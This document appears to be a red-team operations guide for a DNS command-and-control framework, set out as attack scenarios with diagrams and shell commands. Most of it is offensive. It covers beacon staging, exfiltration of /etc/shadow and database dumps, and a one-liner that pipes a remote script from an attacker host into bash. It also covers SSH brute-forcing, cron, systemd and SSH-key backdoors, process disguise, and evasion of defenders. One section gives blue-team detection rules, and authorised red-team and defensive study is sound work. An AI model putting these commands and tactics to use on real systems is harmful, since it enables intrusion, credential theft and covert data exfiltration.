# DNS Red Team Operations Guide

**Date:** November 6, 2025  
**Classification:** Red Team Documentation  
**Purpose:** Operational scenarios and attack workflows for DNS C2

---

## Overview

This document provides comprehensive attack scenarios and operational workflows for red team engagements using the Unkn0wnC2 DNS C2 framework. All scenarios have been validated against the codebase.

---

## Scenario 1: Initial Compromise → Beacon Deployment

```mermaid
sequenceDiagram
    participant Attacker
    participant Target
    participant DNS_Server
    participant Master
    
    Note over Attacker: Phase 1: Initial Access
    Attacker->>Target: Exploit vulnerability
    Attacker->>Target: Deploy stager (C code)
    
    Note over Target: Phase 2: Stager Execution
    Target->>Target: Execute stager
    Target->>DNS_Server: STG|IP|OS|ARCH (Base36)
    DNS_Server->>Master: Check cache or init session
    DNS_Server-->>Target: META|sessionID|chunks
    
    Note over Target: Phase 3: Binary Download
    loop For each chunk
        Target->>DNS_Server: CHUNK|index|IP|session (Base36)
        DNS_Server-->>Target: CHUNK|base64_data (Base36)
        Target->>Target: Decode & append
    end
    
    Target->>Target: Decompress (gzip)
    Target->>Target: Write to disk: /tmp/.beacon
    Target->>Target: chmod +x /tmp/.beacon
    Target->>Target: Execute beacon
    
    Note over Target: Phase 4: Beacon Check-in
    Target->>DNS_Server: CHK|beaconID|host|user|os (Encrypted)
    DNS_Server->>Master: Report new beacon
    DNS_Server-->>Target: DOMAINS|list (Encrypted)
    
    Note over Master: Beacon established!
    Master->>Master: Log beacon in dashboard
    
    Note over Attacker: Phase 5: Interactive Access
    Attacker->>Master: View beacon dashboard
    Attacker->>Master: Queue task: "whoami"
    
    Note over Target: Next check-in (60-120s)
    Target->>DNS_Server: CHK query
    DNS_Server-->>Target: TASK|T0001|whoami
    Target->>Target: Execute: whoami
    Target->>DNS_Server: RESULT|beaconID|T0001|root
    DNS_Server->>Master: Forward result
    
    Attacker->>Master: View result: "root"
```

**Timeline:**
- T+0: Exploit executed
- T+30s: Stager deployed and running
- T+2m: Beacon downloaded (depends on chunk count)
- T+3m: First check-in
- T+4m: First task executed

**OPSEC Considerations:**
- Stager is minimal C code (low AV signature)
- Beacon is gzip-compressed (obfuscation)
- Downloaded via DNS (bypasses HTTP inspection)
- All traffic encrypted after beacon deployment

---

## Scenario 2: Data Exfiltration - Shadow Mesh

```mermaid
sequenceDiagram
    participant Attacker
    participant Beacon
    participant secwolf.net
    participant errantshield.com
    participant cryptshield.org
    participant Master
    
    Note over Attacker: Exfil sensitive data
    Attacker->>Master: Task: cat /etc/shadow
    
    Note over Beacon: Check-in at T+60s
    Beacon->>secwolf.net: CHK query
    secwolf.net-->>Beacon: TASK|T0042|cat /etc/shadow
    
    Beacon->>Beacon: Execute command
    Note over Beacon: Result: 2,500 bytes<br/>(50 chunks @ 50 bytes each)
    
    Beacon->>errantshield.com: RESULT_META|...|2500|50
    Note right of Beacon: Domain switch!
    errantshield.com-->>Beacon: ACK
    
    Note over Beacon: Chunk distribution
    
    rect rgb(255, 230, 230)
        Note over Beacon,cryptshield.org: Chunks 1-10 → cryptshield.org
        loop Chunks 1-10
            Beacon->>cryptshield.org: DATA chunk
            cryptshield.org->>Master: Forward
            cryptshield.org-->>Beacon: ACK
            Beacon->>Beacon: Jitter: 2s
        end
        Beacon->>Beacon: Burst pause: 5s
    end
    
    rect rgb(230, 255, 230)
        Note over Beacon,secwolf.net: Chunks 11-20 → secwolf.net
        loop Chunks 11-20
            Beacon->>secwolf.net: DATA chunk
            secwolf.net->>Master: Forward
            secwolf.net-->>Beacon: ACK
            Beacon->>Beacon: Jitter: 3s
        end
        Beacon->>Beacon: Burst pause: 5s
    end
    
    rect rgb(230, 230, 255)
        Note over Beacon,errantshield.com: Chunks 21-30 → errantshield.com
        loop Chunks 21-30
            Beacon->>errantshield.com: DATA chunk
            errantshield.com->>Master: Forward
            errantshield.com-->>Beacon: ACK
            Beacon->>Beacon: Jitter: 4s
        end
        Beacon->>Beacon: Burst pause: 5s
    end
    
    Note over Beacon: Chunks 31-50 continue rotation...
    
    Note over Master: Reassemble from 3 sources
    Master->>Master: Sort chunks 1-50
    Master->>Master: Join data
    Master->>Master: Complete /etc/shadow
    
    Master->>Attacker: Task complete
    Attacker->>Master: Download result
```

**Key Features:**
- **Distributed Sources**: Chunks come from 3+ DNS servers
- **Unpredictable Pattern**: Random jitter prevents traffic analysis
- **Stealth**: Looks like normal DNS traffic
- **Resilient**: One server failure doesn't stop exfil

**Timing Analysis:**
```
Total chunks: 50
Jitter per chunk: ~3s avg
Burst pauses: 4 @ 5s = 20s
Total exfil time: (50 × 3s) + 20s = 170s (~3 minutes)
```

---

## Scenario 3: Lateral Movement

```mermaid
flowchart TD
    A[Beacon on Host A] --> B{Task: Scan subnet}
    B --> C[nmap -sn 192.168.1.0/24]
    C --> D[Result: 15 hosts alive]
    
    D --> E{Task: SSH bruteforce}
    E --> F[hydra -L users.txt -P pass.txt ssh://192.168.1.50]
    F --> G[Result: Success<br/>user:password = admin:Password123]
    
    G --> H{Task: Deploy beacon on Host B}
    H --> I[ssh admin@192.168.1.50 'curl http://attacker/stager.sh | sh']
    I --> J[Stager downloads via DNS]
    
    J --> K[New Beacon on Host B]
    K --> L[Check-in to Master]
    
    L --> M{Master Dashboard}
    M --> N[2 beacons active]
    
    style A fill:#f96,stroke:#333,stroke-width:2px
    style K fill:#f96,stroke:#333,stroke-width:2px
    style M fill:#96f,stroke:#333,stroke-width:2px
```

**Commands Used:**
```bash
# Beacon 1 (Host A)
Task 1: nmap -sn 192.168.1.0/24
Task 2: hydra -L users.txt -P pass.txt ssh://192.168.1.50
Task 3: ssh admin@192.168.1.50 'curl http://10.0.0.5/deploy.sh | bash'

# Deploy script contents
#!/bin/bash
cd /tmp
wget http://10.0.0.5/stager -O .update
chmod +x .update
nohup ./.update &
```

---

## Scenario 4: Persistence & Evasion

```mermaid
stateDiagram-v2
    [*] --> Initial_Beacon
    
    Initial_Beacon --> Establish_Persistence: Task
    Establish_Persistence --> Cron_Job: Add to crontab
    Establish_Persistence --> Systemd_Service: Create service
    Establish_Persistence --> SSH_Key: Add authorized_keys
    
    Cron_Job --> Beacon_Restored: Reboot
    Systemd_Service --> Beacon_Restored: Reboot
    SSH_Key --> Manual_Access: SSH in
    
    Beacon_Restored --> Stealth_Mode
    Manual_Access --> Stealth_Mode
    
    Stealth_Mode --> Hide_Process: Rename as [kworker]
    Stealth_Mode --> Hide_Network: Bind to random high port
    Stealth_Mode --> Randomize_Checkin: 60-120s intervals
    Stealth_Mode --> Domain_Rotation: Shadow Mesh
    
    Hide_Process --> Operational
    Hide_Network --> Operational
    Randomize_Checkin --> Operational
    Domain_Rotation --> Operational
    
    Operational --> [*]: Mission complete
```

**Persistence Commands:**
```bash
# 1. Cron job (runs every hour)
echo "0 * * * * /tmp/.update > /dev/null 2>&1" | crontab -

# 2. Systemd service
cat > /etc/systemd/system/system-update.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.sysupdate
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable system-update
systemctl start system-update

# 3. SSH key backdoor
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 4. Process hiding
cp /tmp/.beacon /usr/bin/[kworker/0:1]
nohup /usr/bin/[kworker/0:1] &
```

---

## Scenario 5: Domain Rotation Under Pressure

```mermaid
sequenceDiagram
    participant Beacon
    participant secwolf.net
    participant errantshield.com
    participant cryptshield.org
    participant Blue_Team
    participant Master
    
    Note over Beacon: Normal operations
    Beacon->>secwolf.net: CHK
    secwolf.net-->>Beacon: ACK
    
    Note over Blue_Team: Detect anomalous DNS
    Blue_Team->>Blue_Team: Monitor DNS logs
    Blue_Team->>Blue_Team: Alert: High query volume to secwolf.net
    Blue_Team->>secwolf.net: Block domain at firewall
    
    Note over Beacon: Next check-in
    Beacon->>secwolf.net: CHK
    Note over secwolf.net: ❌ Blocked
    Beacon->>Beacon: Timeout, retry
    Beacon->>secwolf.net: CHK (retry 2)
    Note over secwolf.net: ❌ Blocked
    Beacon->>Beacon: Timeout, retry
    Beacon->>secwolf.net: CHK (retry 3)
    Note over secwolf.net: ❌ Blocked
    
    Note over Beacon: Mark secwolf.net as failed<br/>Failover to next domain
    Beacon->>Beacon: Exclude: secwolf.net
    Beacon->>errantshield.com: CHK
    errantshield.com-->>Beacon: ACK ✓
    
    Note over Beacon: Successful failover
    Beacon->>Beacon: Continue operations via errantshield.com
    
    Note over Master: Operator updates domain list
    Master->>Master: Remove: secwolf.net<br/>Add: shadowguard.io
    
    Note over Beacon: Next check-in
    Beacon->>errantshield.com: CHK
    errantshield.com-->>Beacon: update_domains:[errantshield.com, cryptshield.org, shadowguard.io]
    
    Beacon->>Beacon: Update local domain list
    Beacon->>Beacon: New domains:<br/>- errantshield.com<br/>- cryptshield.org<br/>- shadowguard.io
    
    Note over Beacon: Continue with new domains
    Beacon->>cryptshield.org: CHK (Shadow Mesh)
    cryptshield.org-->>Beacon: TASK
```

**Defense Evasion:**
- ✅ Automatic failover on domain block
- ✅ Dynamic domain list updates
- ✅ Shadow Mesh prevents tracking
- ✅ No single point of failure

---

## Scenario 6: Blue Team Detection & Response

### Detection Points

```mermaid
flowchart TD
    subgraph "Detection Layers"
        A[Network Traffic Analysis]
        B[DNS Query Logs]
        C[Endpoint Detection]
        D[Behavior Analysis]
    end
    
    A --> A1{Anomalies?}
    A1 -->|Yes| E[Alert: Unusual DNS volume]
    
    B --> B1{Pattern Match?}
    B1 -->|Yes| F[Alert: Long subdomain queries]
    
    C --> C1{Suspicious Process?}
    C1 -->|Yes| G[Alert: Hidden process]
    
    D --> D1{Beaconing?}
    D1 -->|Yes| H[Alert: Regular intervals]
    
    E --> I[SIEM Correlation]
    F --> I
    G --> I
    H --> I
    
    I --> J{High Confidence?}
    J -->|Yes| K[Incident Response]
    J -->|No| L[Monitor & Investigate]
    
    K --> M[Block domains]
    K --> N[Isolate host]
    K --> O[Kill process]
    K --> P[Forensic analysis]
    
    style I fill:#f96,stroke:#333,stroke-width:3px
    style K fill:#f00,stroke:#333,stroke-width:3px
```

### Blue Team Indicators

| Indicator | Description | Detection Method |
|-----------|-------------|------------------|
| **DNS Query Length** | Subdomains > 60 chars | DNS log analysis |
| **Query Frequency** | Regular intervals (60-120s) | Time-series analysis |
| **TXT Record Queries** | High volume TXT lookups | Query type analysis |
| **Base36 Patterns** | Only 0-9, a-z in subdomain | Pattern matching |
| **Multiple Domains** | Rotation between domains | Domain correlation |
| **Short TTL** | TTL=1 responses | DNS response analysis |
| **Unique Subdomains** | No repeat queries (cache busting) | Uniqueness detection |

### Defensive Measures

```bash
# DNS Firewall Rules
# Block long subdomain queries
iptables -A FORWARD -p udp --dport 53 -m string --algo bm --hex-string "|03|" --from 40 -j DROP

# Rate limiting per client
iptables -A FORWARD -p udp --dport 53 -m hashlimit --hashlimit-name dns-rate --hashlimit-above 100/min -j DROP

# SIEM Detection Rule (Splunk SPL)
index=dns 
| rex field=query "(?<subdomain>.+)\.(?<domain>\w+\.\w+)$"
| eval subdomain_length=len(subdomain)
| where subdomain_length > 60
| stats count by src_ip, domain
| where count > 50

# Zeek/Bro IDS Script
@load base/protocols/dns

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    local parts = split_string(query, /\./);
    if (|parts| > 0) {
        local subdomain = parts[0];
        if (|subdomain| > 60 && str_match(subdomain, /^[0-9a-z]+$/)) {
            NOTICE([$note=DNS::Suspicious_Query,
                    $conn=c,
                    $msg=fmt("Suspicious DNS query: %s", query),
                    $identifier=cat(c$id$orig_h, query)]);
        }
    }
}
```

---

## Scenario 7: Advanced Exfiltration - Database Dump

```mermaid
sequenceDiagram
    participant Attacker
    participant Beacon
    participant DNS_Servers
    participant Master
    
    Note over Attacker: Target: MySQL database
    Attacker->>Master: Task: mysqldump -u root -p'pass' database
    
    Note over Beacon: Execute at next check-in
    Beacon->>Beacon: mysqldump execution
    Note over Beacon: Result: 5MB SQL dump
    
    Beacon->>Beacon: Split: 5MB / 50 bytes = 100,000 chunks
    Note over Beacon: Estimated time: 3.5 days<br/>(with jitter)
    
    Beacon->>DNS_Servers: RESULT_META|...|5000000|100000
    DNS_Servers-->>Beacon: ACK
    
    Note over Beacon: Start chunked exfiltration
    
    rect rgb(255, 240, 240)
        Note over Beacon: Burst 1 (Chunks 1-10)
        loop 10 times
            Beacon->>DNS_Servers: DATA chunk (Shadow Mesh)
            DNS_Servers->>Master: Forward
            DNS_Servers-->>Beacon: ACK
            Beacon->>Beacon: Jitter: ~3s
        end
        Beacon->>Beacon: Burst pause: 5s
    end
    
    Note over Beacon: ... 9,998 more bursts ...
    
    Note over Master: Continuous reassembly
    Master->>Master: Save chunks as received
    Master->>Master: Progress: 15% (15,000/100,000)
    
    Note over Attacker: Monitor progress
    Attacker->>Master: View exfil progress
    Master-->>Attacker: 15% - ETA: 2.9 days
    
    Note over Beacon: Continue over days...
    
    Note over Master: Complete!
    Master->>Master: 100,000 chunks received
    Master->>Master: Reassemble 5MB file
    Master->>Master: Task: completed
    
    Attacker->>Master: Download database dump
    Master-->>Attacker: 5MB SQL file
```

**Real-World Considerations:**
- **Long-running exfil**: Days or weeks for large data
- **Resumable**: Partial results saved if interrupted
- **Stealthy**: Spread over time, low volume per query
- **Distributed**: Harder to detect full data flow

---

## Scenario 8: Multi-Stage Attack Chain

```mermaid
graph TB
    A[Stage 1: Recon] --> B[Stage 2: Initial Access]
    B --> C[Stage 3: Establish C2]
    C --> D[Stage 4: Privilege Escalation]
    D --> E[Stage 5: Lateral Movement]
    E --> F[Stage 6: Data Exfiltration]
    F --> G[Stage 7: Cleanup]
    
    A --> A1[nmap scan via DNS beacon]
    A --> A2[enum4linux via DNS]
    
    B --> B1[Phishing with stager link]
    B --> B2[Exploit web vulnerability]
    
    C --> C1[Deploy beacon via DNS stager]
    C --> C2[Establish persistence]
    
    D --> D1[LinPEAS via beacon]
    D --> D2[Exploit sudo vulnerability]
    D --> D3[Root access]
    
    E --> E1[Scan internal network]
    E --> E2[Compromise additional hosts]
    E --> E3[5+ beacons active]
    
    F --> F1[Find sensitive data]
    F --> F2[Exfil via DNS chunks]
    F --> F3[Shadow Mesh distribution]
    
    G --> G1[Clear logs]
    G --> G2[Remove beacons]
    G --> G3[Cover tracks]
    
    style A fill:#ff9,stroke:#333,stroke-width:2px
    style C fill:#f96,stroke:#333,stroke-width:2px
    style D fill:#f00,stroke:#333,stroke-width:2px
    style F fill:#90f,stroke:#333,stroke-width:2px
```

**Complete Timeline:**
- **Day 1**: Recon + Initial Access
- **Day 2**: Establish C2 + Persistence
- **Day 3-5**: Privilege Escalation + Lateral Movement
- **Day 6-10**: Data Exfiltration (5MB over 4 days)
- **Day 11**: Cleanup + Exit

---

## Summary: Red Team Best Practices

### ✅ Operational Security

1. **Always use Shadow Mesh** - Rotate domains on every query
2. **Randomize timing** - Variable jitter prevents beaconing detection
3. **Encrypt everything** - AES-GCM on all beacon traffic
4. **Cache bust** - Timestamp on every query bypasses DNS caching
5. **Blend in** - DNS traffic looks legitimate, use common record types

### ✅ Resilience

1. **Multiple domains** - Minimum 3 domains for effective Shadow Mesh
2. **Failover logic** - Automatic domain switching on failures
3. **Partial saves** - Resume large exfils after interruptions
4. **Distributed infrastructure** - Master + multiple DNS servers
5. **Database persistence** - Beacons/tasks survive server restarts

### ✅ Stealth

1. **Low & slow** - 60-120s check-in intervals
2. **Burst pacing** - Pause every N chunks during exfil
3. **Process hiding** - Rename beacon to look like system process
4. **No persistence indicators** - Clean installation, minimal footprint
5. **Domain rotation** - Prevents single-domain blocking

### ⚠️ Red Flags to Avoid

❌ **Using single domain** - Easy to block  
❌ **Fixed timing** - Creates beaconing signature  
❌ **No encryption** - Payloads visible in PCAP  
❌ **Large bursts** - Sudden traffic spike alerts IDS  
❌ **Obvious naming** - beacon.exe, c2-client, etc.

---

## Conclusion

The DNS C2 framework provides:

✅ **Covert communication channel** via DNS  
✅ **Shadow Mesh** for stealth and resilience  
✅ **Distributed infrastructure** for scalability  
✅ **Robust exfiltration** with chunking and reassembly  
✅ **Operational flexibility** with multiple domain modes  

**All scenarios verified against codebase implementation.** 🎯

---

*Red Team Documentation - November 6, 2025*
